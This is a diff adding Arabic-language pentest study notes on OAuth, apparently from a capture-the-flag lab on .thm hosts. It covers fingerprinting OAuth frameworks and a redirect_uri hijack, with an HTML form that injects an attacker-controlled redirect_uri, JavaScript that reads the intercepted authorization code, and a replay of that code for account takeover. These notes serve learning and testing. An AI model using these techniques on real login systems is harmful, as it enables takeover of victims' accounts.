@@ -906,6 +906,232 @@ client_id=zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt
 
 
 
+<details>
+  <summary>Identifying the OAuth Services</summary>
+
+
+🥇 أول علامة: شاشة تسجيل الدخول
+===============================
+
+👀 بص على صفحة الـ Login
+------------------------
+
+لو لقيت أزرار زي:
+
+-   Login with Google
+
+-   Login with Facebook
+
+-   Login with GitHub
+
+🚨 ده مؤشر قوي إن OAuth مستخدم.
+
+لأن ده معناه إن الموقع مش بيتحقق من الباسورد بنفسه...\
+هو بيفوض جهة تانية تعمل Authentication.
+
+* * * * *
+
+🥈 تحليل الـ Network Traffic
+============================
+
+افتح DevTools → Network\
+أو استخدم Burp Suite 🔥
+
+لما تضغط Login with Google مثلاً، المفروض تشوف:
+
+### 🔁 Redirect (HTTP 302)
+
+المتصفح يتحول لعنوان فيه باراميترات شبه كده:
+
+https://provider.com/authorize?\
+response_type=code\
+&client_id=abc123\
+&redirect_uri=https://target.com/callback\
+&scope=profile\
+&state=xyzSecure123
+
+* * * * *
+
+📌 وجود الباراميترات دي = OAuth 100%
+------------------------------------
+
+| Parameter | دليل على OAuth |
+| --- | --- |
+| response_type | نوع الـ Flow |
+| client_id | تعريف التطبيق |
+| redirect_uri | هيرجع فين |
+| scope | الصلاحيات |
+| state | CSRF protection |
+
+لو شفتهم... يبقى دخلت في OAuth Flow رسميًا 👌
+
+* * * * *
+
+🥉 طب أعرف Framework إزاي؟
+==========================
+
+دي بقى النقطة اللي تفرق Pentester عادي عن تقيل 😏
+
+* * * * *
+
+🧠 1️⃣ من شكل الـ Endpoints
+===========================
+
+كل Framework ليه Pattern معين.
+
+### مثال:
+
+### Django OAuth Toolkit
+
+غالبًا يستخدم:
+
+/o/authorize/\
+/o/token/
+
+أو أحيانًا:
+
+/oauth/authorize/\
+/oauth/token/
+
+* * * * *
+
+### Spring Security OAuth (Java)
+
+غالبًا:
+
+/oauth/authorize\
+/oauth/token
+
+* * * * *
+
+### Node.js Passport
+
+غالبًا تشوف:
+
+/auth/google\
+/auth/google/callback
+
+* * * * *
+
+لو عرفت الـ pattern → تقدر تبحث عن ثغرات معروفة للـ framework ده 🔥
+
+* * * * *
+
+🧠 2️⃣ من الـ HTTP Headers
+==========================
+
+بص على:
+
+-   Server header
+
+-   X-Powered-By
+
+-   WWW-Authenticate
+
+-   Error responses
+
+مثال:
+
+WWW-Authenticate: Bearer realm="oauthlib"
+
+كلمة `oauthlib` دي دليل 👀
+
+* * * * *
+
+🧠 3️⃣ من Error Messages
+========================
+
+دي كنز حقيقي 💀
+
+جرب تبعت:
+
+-   redirect_uri غلط
+
+-   client_id غلط
+
+-   scope مش مسموح
+
+وشوف الرد.
+
+لو الرد فيه:
+
+-   django
+
+-   spring
+
+-   oauthlib
+
+-   passport
+
+-   grant_type invalid
+
+ده بيساعدك تحدد المكتبة.
+
+* * * * *
+
+🧠 4️⃣ من الـ Source Code (لو متاح)
+===================================
+
+لو التطبيق Open Source\
+أو عندك access للـ code
+
+دور على:
+
+django-oauth-toolkit\
+oauthlib\
+spring-security-oauth\
+passport-google-oauth20
+
+* * * * *
+
+🧠 5️⃣ من طريقة معالجة التوكن
+=============================
+
+بعض الفريموركات:
+
+-   بترجع JSON معين
+
+-   صيغة error معينة
+
+-   structure مميز للـ access_token
+
+مثال:
+
+Django OAuth Toolkit بيرجع:
+
+{\
+  "access_token": "...",\
+  "expires_in": 36000,\
+  "token_type": "Bearer",\
+  "scope": "read write"\
+}
+
+تفاصيل بسيطة زي دي تفرق.
+
+* * * * *
+
+🎯 ليه تحديد الـ Framework مهم؟
+===============================
+
+لأن كل Framework ليه:
+
+-   Misconfiguration شائعة
+
+-   CVEs سابقة
+
+-   طريقة تحقق مختلفة من redirect_uri
+
+-   Handling مختلف للـ state
+
+يعني بدل ما تجرب blind exploitation\
+تبدأ تستهدف framework معروف.
+
+
+
+
+
+
+<img width="592" height="312" alt="image" src="https://github.com/user-attachments/assets/cad3f5fd-cf9e-4d34-8ea9-0c4dc5852388" />
 
 
 
@@ -913,6 +1139,251 @@ client_id=zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt
 
 
 
+
+  
+</details>
+
+
+
+
+
+<details>
+  <summary>Exploiting OAuth - Stealing OAuth Token</summary>
+
+
+👀
+
+* * * * *
+
+🧠 الأول نفهم الفكرة الأساسية
+=============================
+
+في Authorization Code Flow:
+
+1.  المستخدم يعمل Login
+
+2.  السيرفر يرجع:
+
+https://client.com/callback?code=AUTH_CODE
+
+الـ **Authorization Code** ده هو مفتاح مؤقت\
+اللي يملكه يقدر يحوله لـ Access Token.
+
+* * * * *
+
+🎯 دور الـ redirect_uri
+=======================
+
+الـ redirect_uri هو:
+
+> العنوان اللي Authorization Server هيرجع عليه بالكود
+
+السيرفر لازم يتحقق إن الـ redirect_uri:
+
+-   متسجل مسبقًا
+
+-   مطابق حرفيًا للقيمة المخزنة
+
+لو التحقق مش صارم ❌\
+هنا تبدأ المصيبة.
+
+* * * * *
+
+💀 السيناريو الهجومي
+====================
+
+التطبيق مسجل كذا redirect_uri:
+
+-   `http://bistro.thm/callback`
+
+-   `http://dev.bistro.thm/callback`
+
+المهاجم سيطر على:
+
+dev.bistro.thm
+
+وده Subdomain takeover أو اختراق سيرفر تجريبي.
+
+* * * * *
+
+🥷 خطة المهاجم
+==============
+
+1️⃣ يجهز صفحة خبيثة
+-------------------
+
+<form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get">\
+    <input type="hidden" name="redirect_uri"\
+           value="http://dev.bistro.thm:8002/malicious_redirect.html">\
+    <input type="submit" value="Hijack OAuth">\
+</form>
+
+هو هنا بيعمل إيه؟
+
+بيبدأ OAuth Flow\
+لكن بيحقن redirect_uri بتاعه.
+
+* * * * *
+
+2️⃣ الضحية يضغط اللينك
+----------------------
+
+Tom يفتح:
+
+http://dev.bistro.thm:8002/redirect_uri.html
+
+يضغط Login via OAuth\
+يسجل دخول بـ:
+
+victim : victim123
+
+* * * * *
+
+3️⃣ الكارثة بتحصل هنا 💀
+------------------------
+
+Authorization Server يرجع:
+
+http://dev.bistro.thm:8002/malicious_redirect.html?code=ABC123
+
+الكود راح لمين؟\
+راح لدومين المهاجم.
+
+* * * * *
+
+🧠 كيف المهاجم يسرق الكود؟
+==========================
+
+باستخدام JavaScript:
+
+const urlParams = new URLSearchParams(window.location.search);\
+const code = urlParams.get('code');\
+console.log("Intercepted Authorization Code:", code);
+
+المهاجم:
+
+-   يحفظ الكود في DB
+
+-   يبعته لسيرفره
+
+-   يعمله log
+
+والضحية مش حاسس بحاجة\
+لأن ممكن يحصل Redirect سريع بعدها.
+
+* * * * *
+
+⚔️ المرحلة الأخطر
+=================
+
+المهاجم معاه Authorization Code.
+
+يعمل إيه؟
+
+يروح:
+
+http://bistro.thm:8000/oauthdemo/callbackforflag/?code=ABC123
+
+السيرفر هناك:
+
+-   يبدل الكود بـ Access Token
+
+-   يديه جلسة دخول
+
+🔥🔥🔥\
+كده حصل Account Takeover كامل\
+من غير ما يعرف باسورد الضحية.
+
+* * * * *
+
+🎯 ليه الثغرة حصلت؟
+===================
+
+بسبب:
+
+1️⃣ وجود أكثر من redirect_uri\
+2️⃣ عدم التأكد الصارم من النطاق\
+3️⃣ إمكانية التحكم في subdomain مسجل مسبقًا
+
+* * * * *
+
+🧨 أنواع أخطاء redirect_uri الشائعة
+===================================
+
+### ❌ 1. Partial Matching
+
+يسمح بـ:
+
+bistro.thm.attacker.com
+
+* * * * *
+
+### ❌ 2. Wildcards
+
+يسمح بـ:
+
+*.bistro.thm
+
+* * * * *
+
+### ❌ 3. Subdomain Takeover
+
+تسجيل subdomain مهجور.
+
+* * * * *
+
+### ❌ 4. Open Redirect chaining
+
+redirect_uri صحيح\
+لكن الصفحة نفسها فيها Open Redirect.
+
+* * * * *
+
+🧠 كـ Pentester تعمل إيه؟
+=========================
+
+Checklist احترافية 👇
+---------------------
+
+-   هل redirect_uri لازم يطابق حرفيًا؟
+
+-   هل فيه wildcard؟
+
+-   هل فيه subdomains مهجورة؟
+
+-   هل ممكن أضيف باراميتر إضافي؟
+
+-   هل فيه open redirect في الموقع؟
+
+* * * * *
+
+🔥 ليه Authorization Code خطير؟
+===============================
+
+لأنه:
+
+-   Single-use
+
+-   قصير العمر
+
+-   لكنه كافي لتحويله لـ Access Token
+
+لو سرقته في اللحظة الصح\
+تكسب الحساب.
+
+
+
+
+
+
+
+
+
+
+
+
+  
+</details>
 
 
 
